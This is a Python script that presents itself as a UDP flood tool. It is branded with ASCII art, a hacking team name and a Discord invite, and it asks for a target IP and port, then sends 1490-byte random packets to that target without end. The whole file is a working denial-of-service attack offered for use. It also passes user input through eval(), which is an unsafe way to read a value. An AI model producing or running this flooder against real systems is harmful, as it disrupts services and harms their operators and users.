#!/usr/bin/python3
import socket
import random
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1490)

print
print("___________________    _____  __________________________________________")
print("\_   ___ \______   \  /  _  \ \_   _____/   _____/\_   _____/\__    ___/")
print("/    \  \/|       _/ /  /_\  \ |    __) \_____  \  |    __)_   |    ")
print("\     \___|    |   \/    |    \|     \  /        \ |        \  |    |")
print(" \______  /____|_  /\____|__  /\___  / /_______  //_______  /  |____|")
print("        \/       \/         \/     \/          \/         \/")
print ("Crafset  : AZERT-HACK")
print ("Team : CYBER ATTACK ")
print ("Discord : https://discord.gg/GcQAWW4kUZ")
print
print("______________________________________")
ip = input("Enter IP Adress: ")
port = eval(input("Enter Port: "))
sent = 0

while True:
    sock.sendto(bytes,(ip,port))
    sent = sent +1
    print("Sent %s packet to %s through port : %s"%(sent,ip,port))
